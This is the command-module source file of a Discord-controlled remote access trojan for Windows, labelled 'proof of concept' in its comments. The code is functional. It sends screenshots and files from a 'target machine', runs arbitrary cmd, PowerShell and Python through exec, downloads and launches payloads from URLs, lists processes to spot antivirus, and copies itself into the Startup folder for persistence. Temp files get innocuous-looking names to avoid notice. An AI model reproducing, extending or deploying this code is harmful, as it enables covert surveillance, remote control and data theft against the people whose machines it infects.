# features.py
# made 09/02/2026
# modified ' ' '
# made to move functions here to use match instead of if statements
# in the main message check.

# imports

import pathlib
import os
from persistent_commandline import create_persistent_ps
from persistent_commandline import pexecute_command
from sendmessage import sendmsg
from sendmessage import sendfile
from PIL import ImageGrab
from get_sysinfo import get_sysinfo
from execute_command import execute_command
from utils import get_full_command, filetest
import aiohttp
import psutil
import shutil
import discord
import tempfile
import time

# functions
# PROOF OF CONCEPT VULNERABILITIES
async def features_sysinfo(channel): # system informaiton, see more at get_sysinfo.py
    """ See get_sysinfo.py  for docs"""
    await sendmsg(channel,get_sysinfo())

async def features_screenshot(channel): # proof of concept for RAT
    """ 
    Self explanatory
    """
    temp_file_dir = tempfile.gettempdir()

    screenshot_path = pathlib.Path(f"{temp_file_dir}/temporary_screen_resolution_fixer.png")
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_path)
    
    await sendmsg(channel,"Saved screenshot.")
    await sendfile(channel,screenshot_path)
    os.remove(screenshot_path)
    await sendmsg(channel,"Removed screenshot.")

async def features_run_cmd(channel,msgargs): # proof of concept for  reverse-shell
    """
    Takes two variables, channel and msgargs [command arguments].
    Executes the command in a disposable hidden cmd session, sends the output as a message.
    """
    output = await execute_command(['cmd', '/c', msgargs[1]])
    await sendmsg(channel,f"ran {msgargs[1]} result: {output}")

async def features_run_ps(channel,msgargs): # proof of concept for  reverse-shell
    """
    Takes two variables, channel and msgargs [command arguments].
    Executes the command in a disposable hidden powershell session, sends the output as a message.
    """
    output = await execute_command(['powershell', '/c', msgargs[1]])
    await sendmsg(channel,f"ran {msgargs[1]} result: {output}")

async def features_prun_ps(channel,msgargs,persistent_ps_session): # proof of concept for  reverse-shell
    """
    Takes 3 arguments, outputs [message sending] the result of the command.
    :param channel: The channel message was sent.
    :param msgargs: Command arguments.
    :param persistent_ps_session: The current persistent powershell session.
    """
    msgcontent = msgargs[0]
    full_command = ""
    
    if not persistent_ps_session  : 

        persistent_ps_session = create_persistent_ps()
        await sendmsg(channel,f"Created new persistent powershell session.")

    for text in msgargs:
             
             if text is msgcontent : pass
             else :
                 
                 full_command = f"{full_command} {text}"
                
    output = pexecute_command(persistent_ps_session,full_command)
         
    await sendmsg(channel,f"ran command {full_command} || {output}")
    return persistent_ps_session

async def features_create_persistent_ps_session(channel,persistent_ps_session): # proof of concept for  reverse-shell
    """
    Removes the current persistent powershell session if it exists.
    Creates and returns a new one.
    
    :param channel: The channel message was sent
    :param persistent_ps_session: The current persistent powershell session
    """
    if persistent_ps_session != None:
            await sendmsg(channel,f"Found existing persistent powershell session.")
            persistent_ps_session.stdin.close() # type: ignore
            persistent_ps_session.terminate()
            persistent_ps_session.wait()
            await sendmsg(channel,f"Deleted existing persistent powershell session.")
    persistent_ps_session = create_persistent_ps()
    await sendmsg(channel,f"Created persistent powershell session.")
    return persistent_ps_session

async def features_download_file(channel,msgargs):# proof of concept for extracting info
     """
     Takes two parameters, sends the file to user if possible.
     
     :param channel: The channel the message was sent in.
     :param msgargs: Command arguments.
     """
     filepath = msgargs[1]
     await sendfile(channel,filepath)

async def features_install_file(channel,msgargs): # proof of concept for extracting trojan 
     """
     Downloads file from URL. Does not run it.
     
     :param channel: The channel message was sent.
     :param msgargs: Command arguments.
     """
     if len(msgargs) < 4: await sendmsg(channel, "Usage : <url> <filename> <path_to_save>")
     url = msgargs[1]
     filename = msgargs[2]
     save_path = msgargs[3]
     
     file_path = pathlib.Path(save_path) / filename

     try:
      async with aiohttp.ClientSession() as session:
       async with session.get(url) as response:
        if response.status != 200: # Succed status code
          await sendmsg(channel,"Could not download file from URL.")
          return
        

        with open(file_path,"wb") as f:
          f.write(await response.read())
        # await sendfile(channel,file_path)

     except Exception as E:
         await sendmsg(channel,f"ERR:{E}")
         if file_path.exists():
            os.remove(file_path)

async def features_run_file(channel,msgargs): # proof of concept for  trojan
    """
    Runs an file using os.startfile
    
    :param channel: The channel message was sent in.
    :param msgargs: Command arguments
    """
    filepath = msgargs[1]

    problems = []

    if not os.path.exists(filepath):
        problems.append("File does not exist.")
    if os.path.isdir(filepath):
        problems.append("File is a directory.")
    if not os.access(filepath, os.R_OK):
        problems.append("File is not readable.")

    if len(problems) != 0:
        await sendmsg(channel,f"There were problems {problems}")
    else:
        try:
            os.startfile(filepath)
        except Exception as E:
            await sendmsg(channel,f"ERR:{E}")

async def features_see_running_apps(channel): # proof of concept for exploiting and seeing AV
    """
     Sends an message containing all the running apps.
     
     :param channel: The channel the message was sent in.
     
    """
    
    processes = {}
    #   Get all running processes
    await sendmsg(channel,"Collecting procs.")
    for proc in psutil.process_iter(['pid', 'name']):
        
        try:
            processes[proc.info['pid']] = proc.info['name']
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            await sendmsg(channel,f"Unable to acces process {proc}")
            pass
    
    await sendmsg(channel,str(processes))

async def features_zip_and_download(channel,msgargs): # proof of concept for extracting info
    """
    Tries to zip and send a file.
    Sends a error message or problem message if any exist.
    
    :param channel: The channel message was sent in.
    :param msgargs: Command arguments.
    """

    temp_file_dir = tempfile.gettempdir()

    filepath = msgargs[1]

    path_to_zip = f"{temp_file_dir}/windows_zipping_manager"

    newzippedfilepath = f"{path_to_zip}.zip"
    
    if not os.path.exists(filepath):
        await sendmsg(channel,f"No such thing as {filepath}")
        return
    if not os.access(filepath, os.R_OK):
        await sendmsg(channel,"File cannot be accessed.")
        return

    try:
        shutil.make_archive(path_to_zip,"zip", filepath)
        
    except Exception as E:
        await sendmsg(channel, f"ERR : {E}")

        if os.path.exists(newzippedfilepath):
            os.remove(newzippedfilepath)
        return
    

    problems = [] # problems we have about sending the file.
    # lets see if we actually can send the file first.
    if not os.path.exists(newzippedfilepath):
        problems.append("File does not exist.")
    if os.path.isdir(newzippedfilepath):
        problems.append("File is a directory.")
    if not os.access(newzippedfilepath, os.R_OK):
        problems.append("File is not readable.")
    if not os.path.getsize(newzippedfilepath) < 8 * 1024 * 1024: # discord file size limit is 8mb, if its bigger we cant send it.
        problems.append("File is too big to send. [>8mb]")
    if len(problems) != 0:
        Message = f"There were problems sending : {problems}"
        
        if os.path.exists(newzippedfilepath):
            os.remove(newzippedfilepath)
        
        await sendmsg(channel,Message)
    
    print("testt")
    file_to_send = discord.File(newzippedfilepath)
    await channel.send(file=file_to_send)

    os.remove(newzippedfilepath)

async def features_execute_python_code(channel,msgargs): # proof of concept for  trojan
    """
    Uses exec() to run a python code.
    
    :param channel: The channel message was sent in.
    :param msgargs: Command arguments.
    """

    full_command = get_full_command(msgargs).strip() # str
    
    
    try:
     result = exec(full_command)
     await sendmsg(channel,"Command ran.")
    except Exception as E:
        await sendmsg(channel,f"ERR at EXEC : | {str(E)}")
    
async def features_add_to_startup(channel,msgargs): # proof of concept for  trojan
    """
    Adds the File into Startup folder of windows.
    
    :param channel: The channel message was sent in.
    :param msgargs: Commnand arguments.
    """

    

    filepath = msgargs[1]
    
    appdata_path = os.getenv("APPDATA")
    startup_path = pathlib.Path(f"{appdata_path}/Microsoft/Windows/Start Menu/Programs/Startup")

    print(startup_path,filepath)
    problems = filetest(filepath,[1,2,3])

    if len(problems) != 0:
        await sendmsg(channel,f"There were some problems : {problems}")
        return
    
    try:
        shutil.copy(filepath,startup_path) 
    except Exception as E:
        await sendmsg(channel,f"ERR at add_to_startup || {E}")
    
async def features_autostart_self(): # Proof of concept persistance
    """
    Identifies the currently running script and copies it to the 
    Windows Startup folder to ensure persistence.
    """
    
    time.sleep(15)
    try:
        # Get the absolute path of the currently executing script
        import sys
        our_path = pathlib.Path(sys.argv[0]).resolve()
        
        # Define the Windows Startup path
        appdata_path = os.getenv("APPDATA")
        startup_path = pathlib.Path(appdata_path) / "Microsoft/Windows/Start Menu/Programs/Startup" # type: ignore
        
        # Define the destination (using the same filename)
        destination = startup_path / our_path.name

        # Perform the copy
        shutil.copy2(our_path, destination)
        
        
    except Exception as E:
        pass
    
async def features_moreinfo(channel):

    info = """
    Help on installing files :
    You cannot [file in your computer] -> [target machine] directly.
    You must use a filehoster, github or a website that can give you an URL for direct-file downloading.
    Mediafire seems to bug out for some reason.
    Github works perfectly.
    Example:
    You upload your shit to X filehoster, if it has a direct download link
    [A link where you dont land on a 'download' page but just prompt for file saving.]
    You take a zip, save it as virus.zip
    Boom works.

    Help on prun_ps :
    Persistent Powershells are bugged due to a recent windows update on windows 11.
    There may be more issues it is not widely tested.

    Help on autostart_self() :
     This is IN features.py but it isnt meant to be used by you lmao.
     It is for the script to auto-launch not for a command.
    
    
"""


    await sendmsg(channel,info)

async def features_help(channel):
    """
    Messages out all the avaible commands.
    
    :param channel: The channel the message was sent in.
    """

    dict_commands = {
    #    Command         Description               Usage      Prefixes

        "moreinfo" : ["Spits out a bunch of information inchange youre stuck with a command","Barebone.","moreinfo,help2"],

        "hi" : ["Messages back 'hello' ","Barebone","hi,hello"],
        "help" : ["Lists all avaible commands.","Barebone.","help,commands"],
        "sysinfo" : ["Gives information on target machine.","Barebone.","sysinfo,system_information"],
        "screenshot" : ["Sends a screenshot of the target machine","Barebone.","screenshot,ss"],
        "create_persistent_ps" : ["Create's an persistent powershell session on target machine.","Barebone.","create_persistent_ps,cp_ps"],
        "allprocs" : ["Blurts out all running processes.", "Barebone.", "allprocs,allapps,apps"],
        "run_cmd" : ["Runs a cmd command on a temp cmd session.", "cmd [command]", "run_cmd,cmd"],
        "run_ps" : ["Runs a powershell command on a temp ps session", "run_ps [command]", "run_ps,run_powershell"],
        "prun_ps" : ["Creates a persistent powershell session if it does not exist, runs the command on the session.", "prun_ps [command]", "prun_ps,persistent_run_ps,ps"],
        "download_file" : ["Attempts at downloading an single file [no directories and under 80mb,accesible,exists.]", "gimme [path]", "download_file,gimme"],
        "install_file" : ["Downloads a file onto target machine from an URL.", "giveit <url> <filename> <path_to_save>", "install_file,giveit"],
        "run_file" : ["Runs a existing file [exists,runable ..]","bark [path]","run_file,run,bark"],
        "zip" : ["Zips and downloads an file on target computer","zip [path]", "zip,gimme_zip,zip_download"],
        "exec" : ["Runs python code on target computer.","exec [code]","exec,run_py,run_python"],
        "autostart" : ["Puts a file into autostart folder of windows.","autostart [path]","add_to_startup,ats,autostart"],
        
        "!quitbot" : ["Attempts at a clean, quiet shutdown of bot from target machine","Barebone.","!quitbot"],
        "!forcequit" : ["Forces exit of the bot.","Barebone.","!forcequit"],
        "example_command" : ["Description","Usage arguments, Barebone => No arguments.","Prefixes [other ways you can say to run the same command.]"]
    }

    title = "## Command   | Description   | Usage     |   Prefixes"

    message = f"""{title} \n"""

    for command,values in dict_commands.items():

        description, usage, prefixes = values

        new_line = f"**{command}** | {description} , **{usage}** , *{prefixes}* \n"

        message =  f"{message} {new_line}"
    

    await sendmsg(channel,message)

